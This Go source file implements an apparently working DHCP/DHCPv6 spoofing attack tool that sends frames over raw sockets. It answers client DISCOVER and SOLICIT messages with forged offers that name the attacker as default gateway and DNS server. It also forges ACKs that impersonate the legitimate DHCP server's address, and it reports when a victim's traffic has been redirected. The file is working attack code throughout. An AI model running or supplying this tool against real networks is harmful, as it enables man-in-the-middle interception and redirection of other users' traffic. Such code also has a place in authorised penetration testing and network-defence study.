// Package dhcp implements a DHCP starvation/spoofing poisoner for IPv4
// (RFC 2131) and its IPv6 equivalent, DHCPv6 (RFC 8415).
//
// Mechanism: every DISCOVER
// (v4) / SOLICIT (v6) gets a fake OFFER/ADVERTISE racing the real DHCP
// server, handing out the next free address from an attacker-controlled
// pool with the attacker as router and DNS server. Every REQUEST gets a
// fake ACK/REPLY confirming whatever address the client asked for. A
// passive logger reports every DHCP message seen on the wire — DISCOVER,
// REQUEST, OFFER, ACK, NAK, INFORM, DECLINE, RELEASE and their DHCPv6
// counterparts — including the real server's replies, so a race against a
// legitimate DHCP server is visible.
//
// Like libs/arp, replies are crafted as full Ethernet frames over a raw
// AF_PACKET socket: a client with no IP yet (DHCPv4) can't be reached
// through the normal ARP-resolved IP stack, so the destination MAC is taken
// straight from the request instead.
package dhcp

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	colorBrightPurple = "\x1b[95m"
	colorReset        = "\x1b[0m"

	defaultLeaseSeconds   = 86400 // 24h
	defaultPreferredV6Sec = 43200 // 12h
	defaultValidV6Sec     = 86400 // 24h
)

// rawSocket is the minimal raw-Ethernet-frame transport every OS backend
// must provide. socket_linux.go implements it for real; socket_other.go
// stubs it out so the project still compiles on non-Linux GOOS targets.
type rawSocket interface {
	Send(frame []byte) error
	Recv(buf []byte) (int, error)
	SetReadTimeout(d time.Duration) error
	Close() error
}

func tag() string { return colorBrightPurple + "[DHCP]" + colorReset }

func formatMACUpper(mac net.HardwareAddr) string { return strings.ToUpper(mac.String()) }

// checksum computes the standard one's-complement Internet checksum
// (RFC 1071) over the concatenation of all supplied buffers in a single
// pass, as if they were one contiguous stream — an odd leftover byte at
// the end of one buffer is paired with the first byte of the next rather
// than padded on its own, which would miscompute whenever an individual
// buffer (not just the total) has odd length.
func checksum(buffers ...[]byte) uint16 {
	var sum uint32
	var pending []byte
	for _, buf := range buffers {
		if len(pending) == 1 {
			buf = append(append([]byte{}, pending...), buf...)
			pending = nil
		}
		n := len(buf)
		i := 0
		for ; i+1 < n; i += 2 {
			sum += uint32(buf[i])<<8 | uint32(buf[i+1])
		}
		if i < n {
			pending = buf[i:n]
		}
	}
	if len(pending) == 1 {
		sum += uint32(pending[0]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// buildEthHeader builds a 14-byte Ethernet II header.
func buildEthHeader(dst, src net.HardwareAddr, ethType uint16) []byte {
	b := make([]byte, 14)
	copy(b[0:6], dst)
	copy(b[6:12], src)
	binary.BigEndian.PutUint16(b[12:14], ethType)
	return b
}

func readLine(r *bufio.Reader, label string) string {
	fmt.Print(label)
	line, _ := r.ReadString('\n')
	return strings.TrimSpace(line)
}

func ifaceIPv4Net(iface *net.Interface) (net.IP, *net.IPNet, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, nil, err
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				return ip4, ipnet, nil
			}
		}
	}
	return nil, nil, fmt.Errorf("no IPv4 address on interface %s", iface.Name)
}

func ifaceIPv6LinkLocal(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok {
			if ipnet.IP.To4() == nil && ipnet.IP.IsLinkLocalUnicast() {
				return ipnet.IP, nil
			}
		}
	}
	return nil, fmt.Errorf("no IPv6 link-local address on interface %s", iface.Name)
}

// parseIPPool parses a pool string like "192.168.0.2-254": a full IPv4
// address followed by an optional "-<end-octet>" range on the last octet.
func parseIPPool(s string) (net.IP, net.IP, error) {
	s = strings.TrimSpace(s)
	dash := strings.LastIndex(s, "-")
	if dash == -1 {
		ip := net.ParseIP(s)
		if ip == nil || ip.To4() == nil {
			return nil, nil, fmt.Errorf("expected format like 192.168.0.2-254")
		}
		return ip.To4(), ip.To4(), nil
	}
	start := net.ParseIP(s[:dash])
	if start == nil || start.To4() == nil {
		return nil, nil, fmt.Errorf("expected format like 192.168.0.2-254")
	}
	endOctet, err := strconv.Atoi(s[dash+1:])
	if err != nil || endOctet < 0 || endOctet > 255 {
		return nil, nil, fmt.Errorf("expected format like 192.168.0.2-254")
	}
	end := append(net.IP{}, start.To4()...)
	end[3] = byte(endOctet)
	return start.To4(), end, nil
}

// ipPool hands out sequential IPv4 addresses from a configured range.
type ipPool struct {
	mu   sync.Mutex
	next uint32
	end  uint32
}

func newIPPool(start, end net.IP) *ipPool {
	return &ipPool{next: binary.BigEndian.Uint32(start.To4()), end: binary.BigEndian.Uint32(end.To4())}
}

func (p *ipPool) Next() (net.IP, bool) {
	p.mu.Lock()
	defer p.mu.Unlock()
	if p.next > p.end {
		return nil, false
	}
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, p.next)
	p.next++
	return ip, true
}

// ipv6Pool hands out sequential addresses on our own /64, since the
// operator only configures an IPv4-shaped pool — there's no separate
// v6-range prompt, so addresses are derived from our own discovered prefix.
type ipv6Pool struct {
	mu     sync.Mutex
	prefix net.IP
	next   uint64
}

func newIPv6Pool(ourIP6 net.IP) *ipv6Pool {
	prefix := append(net.IP{}, ourIP6.To16()...)
	for i := 8; i < 16; i++ {
		prefix[i] = 0
	}
	return &ipv6Pool{prefix: prefix, next: 1}
}

func (p *ipv6Pool) Next() net.IP {
	p.mu.Lock()
	defer p.mu.Unlock()
	ip := append(net.IP{}, p.prefix...)
	binary.BigEndian.PutUint64(ip[8:16], p.next)
	p.next++
	return ip
}

func optIP(b []byte) net.IP {
	if len(b) != 4 {
		return nil
	}
	return net.IP(b)
}

func routerOrInvalid(router net.IP) string {
	if router == nil || router.Equal(net.IPv4zero) {
		return "invalid"
	}
	return router.String()
}

func dhcpv4MsgName(t byte) string {
	switch t {
	case msgDiscover:
		return "DISCOVER"
	case msgRequest:
		return "REQUEST"
	case msgDecline:
		return "DECLINE"
	case msgRelease:
		return "RELEASE"
	case msgInform:
		return "INFORM"
	default:
		return fmt.Sprintf("TYPE-%d", t)
	}
}

func dhcpv6MsgName(t byte) string {
	switch t {
	case msgSolicit:
		return "SOLICIT"
	case msgAdvertise:
		return "ADVERTISE"
	case msgRequestV6:
		return "REQUEST"
	case msgConfirm:
		return "CONFIRM"
	case msgRenew:
		return "RENEW"
	case msgRebind:
		return "REBIND"
	case msgReplyV6:
		return "REPLY"
	case msgReleaseV6:
		return "RELEASE"
	case msgDeclineV6:
		return "DECLINE"
	case msgReconfigure:
		return "RECONFIGURE"
	case msgInfoRequest:
		return "INFORMATION-REQUEST"
	default:
		return fmt.Sprintf("TYPE-%d", t)
	}
}

func logClientV4(mac net.HardwareAddr, msgType byte, ip net.IP) {
	if ip != nil {
		fmt.Printf("%s %s %s %s\n", tag(), formatMACUpper(mac), dhcpv4MsgName(msgType), ip)
	} else {
		fmt.Printf("%s %s %s \n", tag(), formatMACUpper(mac), dhcpv4MsgName(msgType))
	}
}

func logServerV4(serverIP net.IP, msgType byte, client, netmask, router, dns net.IP, domain string) {
	name := "OFFER"
	if msgType == msgAck {
		name = "ACK"
	}
	line := fmt.Sprintf("%s %s : %s %s GW %s ", serverIP, name, client, netmask, routerOrInvalid(router))
	if dns != nil && !dns.Equal(net.IPv4zero) {
		line += fmt.Sprintf("DNS %s ", dns)
	}
	if domain != "" {
		line += fmt.Sprintf("%q", domain)
	}
	fmt.Printf("%s %s\n", tag(), line)
}

func logClientV6(mac net.HardwareAddr, msgType byte, ip net.IP) {
	if ip != nil {
		fmt.Printf("%s %s %s %s\n", tag(), formatMACUpper(mac), dhcpv6MsgName(msgType), ip)
	} else {
		fmt.Printf("%s %s %s \n", tag(), formatMACUpper(mac), dhcpv6MsgName(msgType))
	}
}

func logServerV6(serverIP net.IP, msgType byte, client, dns net.IP) {
	name := dhcpv6MsgName(msgType)
	line := fmt.Sprintf("%s %s : %s", serverIP, name, client)
	if dns != nil {
		line += fmt.Sprintf(" DNS %s", dns)
	}
	fmt.Printf("%s %s\n", tag(), line)
}

// Poisoner runs the DHCPv4/DHCPv6 starvation attack on one interface.
type Poisoner struct {
	Interface string

	ourMAC net.HardwareAddr
	ourIP4 net.IP
	mask   net.IP
	dns4   net.IP
	ourIP6 net.IP
	dns6   net.IP

	poolV4 *ipPool
	poolV6 *ipv6Pool
}

func (p *Poisoner) Run() error {
	iface, err := net.InterfaceByName(p.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", p.Interface, err)
	}

	fmt.Printf("Using interface :%s\n", p.Interface)
	r := bufio.NewReader(os.Stdin)

	poolInput := readLine(r, "IP Pool: ")
	startIP, endIP, err := parseIPPool(poolInput)
	if err != nil {
		return fmt.Errorf("invalid IP pool %q: %w", poolInput, err)
	}

	maskInput := readLine(r, "Netmask: ")
	mask := net.ParseIP(maskInput)
	if mask == nil || mask.To4() == nil {
		return fmt.Errorf("invalid netmask: %q", maskInput)
	}

	// DNS is optional: pressing Enter leaves it blank and we default to
	// pointing DNS at ourselves (see below). A non-empty but unparseable
	// value is still an error.
	dnsInput := readLine(r, "DNS Server IP (optional): ")
	var dnsIP net.IP
	if dnsInput != "" {
		dnsIP = net.ParseIP(dnsInput)
		if dnsIP == nil {
			return fmt.Errorf("invalid DNS server IP: %q", dnsInput)
		}
	}

	ourIP4, _, err := ifaceIPv4Net(iface)
	if err != nil {
		return err
	}
	ourIP6, _ := ifaceIPv6LinkLocal(iface) // best-effort; DHCPv6 side is skipped if absent

	fmt.Printf("Gateway IP: %s\n", ourIP4)
	fmt.Println()

	p.ourMAC = iface.HardwareAddr
	p.ourIP4 = ourIP4
	p.mask = mask.To4()
	p.ourIP6 = ourIP6
	p.poolV4 = newIPPool(startIP, endIP)
	if ourIP6 != nil {
		p.poolV6 = newIPv6Pool(ourIP6)
	}

	// The intent is always to point DNS at the attacker. Whichever address
	// family the operator typed becomes that family's DNS answer; the other
	// family — and both families when the prompt was left blank — falls back
	// to our own interface address.
	switch {
	case dnsIP == nil:
		p.dns4 = ourIP4
		p.dns6 = ourIP6
	case dnsIP.To4() != nil:
		p.dns4 = dnsIP
		p.dns6 = ourIP6
	default:
		p.dns6 = dnsIP
		p.dns4 = ourIP4
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	buf := make([]byte, 1514)
	for {
		n, err := sock.Recv(buf)
		if err != nil {
			continue
		}
		frame := make([]byte, n)
		copy(frame, buf[:n])
		go p.handleFrame(sock, frame)
	}
}

func (p *Poisoner) handleFrame(sock rawSocket, frame []byte) {
	if _, _, srcIP, _, srcPort, dstPort, payload, ok := parseEthIPv4UDP(frame); ok {
		if srcPort != dhcpServerPort && srcPort != dhcpClientPort && dstPort != dhcpServerPort && dstPort != dhcpClientPort {
			return
		}
		if f, ok := parseDHCPv4(payload); ok {
			p.handleV4(sock, f, srcIP)
		}
		return
	}
	if p.ourIP6 == nil {
		return
	}
	if srcMAC, _, srcIP, _, srcPort, dstPort, payload, ok := parseEthIPv6UDP(frame); ok {
		if srcPort != dhcpv6ServerPort && srcPort != dhcpv6ClientPort && dstPort != dhcpv6ServerPort && dstPort != dhcpv6ClientPort {
			return
		}
		if f, ok := parseDHCPv6(payload); ok {
			p.handleV6(sock, f, srcIP, srcMAC)
		}
	}
}

func (p *Poisoner) handleV4(sock rawSocket, f *frameV4, srcIP net.IP) {
	switch f.op {
	case bootRequest:
		switch f.msgType {
		case msgDiscover:
			logClientV4(f.chaddr, msgDiscover, nil)
			p.spoofDiscoverV4(sock, f, srcIP)
		case msgRequest:
			logClientV4(f.chaddr, msgRequest, f.requestedIP())
			p.spoofRequestV4(sock, f, srcIP)
		case msgInform:
			logClientV4(f.chaddr, msgInform, f.ciaddr)
		case msgDecline:
			logClientV4(f.chaddr, msgDecline, f.requestedIP())
		case msgRelease:
			logClientV4(f.chaddr, msgRelease, f.ciaddr)
		}
	case bootReply:
		switch f.msgType {
		case msgOffer, msgAck:
			logServerV4(srcIP, f.msgType, f.yiaddr, optIP(f.options[optSubnetMask]),
				optIP(f.options[optRouter]), optIP(f.options[optDNS]), string(f.options[optDomainName]))
		case msgNak:
			fmt.Printf("%s %s NAK\n", tag(), srcIP)
		}
	}
}

func (p *Poisoner) spoofDiscoverV4(sock rawSocket, f *frameV4, reqSrcIP net.IP) {
	offered, ok := p.poolV4.Next()
	if !ok {
		return // pool exhausted
	}
	opts := dhcpv4Options{serverID: p.ourIP4, mask: p.mask, router: p.ourIP4, dns: p.dns4, leaseSec: defaultLeaseSeconds}
	body := append(f.replyHeader(offered, p.ourIP4), opts.encode(msgOffer)...)
	frame := buildDHCPv4Frame(f.chaddr, p.ourMAC, p.ourIP4, replyDestIPv4(reqSrcIP), body)
	sock.Send(frame)

	fmt.Printf("%s fake OFFER %s offering %s \n", tag(), formatMACUpper(f.chaddr), offered)
	logServerV4(p.ourIP4, msgOffer, offered, p.mask, p.ourIP4, p.dns4, "")
}

func (p *Poisoner) spoofRequestV4(sock rawSocket, f *frameV4, reqSrcIP net.IP) {
	client := f.requestedIP()
	if client == nil {
		return
	}
	// Reply as whichever server the client selected (DHCP option 54). When
	// the client accepted the real DHCP server's offer instead of ours, its
	// REQUEST names that server; sending our ACK from our own IP would then
	// be ignored. So we spoof the IP source address, siaddr and server-id of
	// the reply to be the selected server — but the router and DNS options
	// still point at us, so the lease the client commits to is ours either
	// way. This races the genuine ACK..
	serverID := p.ourIP4
	if sid := optIP(f.options[optServerID]); sid != nil {
		serverID = sid
	}
	router := p.ourIP4
	opts := dhcpv4Options{serverID: serverID, mask: p.mask, router: router, dns: p.dns4, leaseSec: defaultLeaseSeconds}
	body := append(f.replyHeader(client, serverID), opts.encode(msgAck)...)
	frame := buildDHCPv4Frame(f.chaddr, p.ourMAC, serverID, replyDestIPv4(reqSrcIP), body)
	sock.Send(frame)

	fmt.Printf("%s fake ACK %s assigned to %s\n", tag(), formatMACUpper(f.chaddr), client)
	logServerV4(serverID, msgAck, client, p.mask, router, p.dns4, "")
	p.reportSpoofSuccess(f.chaddr, client, router)
}

// reportSpoofSuccess prints the confirmation banner after an ACK, but only
// when that ACK hands the client a default gateway of our own IP — the
// GW==attacker condition that means traffic redirection took. DNS pointing
// at us is intentionally not part of the test; the gateway is what matters.
func (p *Poisoner) reportSpoofSuccess(mac net.HardwareAddr, ip, router net.IP) {
	if router == nil || !router.Equal(p.ourIP4) {
		return
	}
	fmt.Printf("- DHCP Spoofing was successful: now %s has %s ip address.\n",
		formatMACUpper(mac), ip)
}

func (p *Poisoner) handleV6(sock rawSocket, f *frameV6, srcIP net.IP, srcMAC net.HardwareAddr) {
	switch f.msgType {
	case msgSolicit:
		logClientV6(srcMAC, msgSolicit, nil)
		p.spoofSolicit(sock, f, srcMAC, srcIP)
	case msgRequestV6:
		logClientV6(srcMAC, msgRequestV6, f.reqAddr)
		p.spoofRequestV6(sock, f, srcMAC, srcIP)
	case msgConfirm, msgRenew, msgRebind, msgReleaseV6, msgDeclineV6:
		logClientV6(srcMAC, f.msgType, f.reqAddr)
	case msgInfoRequest:
		logClientV6(srcMAC, msgInfoRequest, nil)
	case msgAdvertise, msgReplyV6:
		logServerV6(srcIP, f.msgType, f.reqAddr, optIP6(f.options[optDNSServers6]))
	}
}

func optIP6(b []byte) net.IP {
	if len(b) < 16 {
		return nil
	}
	return net.IP(b[:16])
}

func (p *Poisoner) spoofSolicit(sock rawSocket, f *frameV6, srcMAC net.HardwareAddr, srcIP net.IP) {
	offered := p.poolV6.Next()
	opts := dhcpv6Options{
		serverDUID: buildServerDUID(p.ourMAC),
		clientDUID: f.clientDUID,
		iaid:       f.iaid,
		addr:       offered,
		dns:        p.dns6,
		preferred:  defaultPreferredV6Sec,
		valid:      defaultValidV6Sec,
	}
	body := buildDHCPv6Body(msgAdvertise, f.xid, opts.encode())
	frame := buildDHCPv6Frame(srcMAC, p.ourMAC, p.ourIP6, srcIP, body)
	sock.Send(frame)

	fmt.Printf("%s fake ADVERTISE %s offering %s \n", tag(), formatMACUpper(srcMAC), offered)
	logServerV6(p.ourIP6, msgAdvertise, offered, p.dns6)
}

func (p *Poisoner) spoofRequestV6(sock rawSocket, f *frameV6, srcMAC net.HardwareAddr, srcIP net.IP) {
	client := f.reqAddr
	if client == nil {
		return
	}
	opts := dhcpv6Options{
		serverDUID: buildServerDUID(p.ourMAC),
		clientDUID: f.clientDUID,
		iaid:       f.iaid,
		addr:       client,
		dns:        p.dns6,
		preferred:  defaultPreferredV6Sec,
		valid:      defaultValidV6Sec,
	}
	body := buildDHCPv6Body(msgReplyV6, f.xid, opts.encode())
	frame := buildDHCPv6Frame(srcMAC, p.ourMAC, p.ourIP6, srcIP, body)
	sock.Send(frame)

	fmt.Printf("%s fake REPLY %s assigned to %s\n", tag(), formatMACUpper(srcMAC), client)
	logServerV6(p.ourIP6, msgReplyV6, client, p.dns6)
}
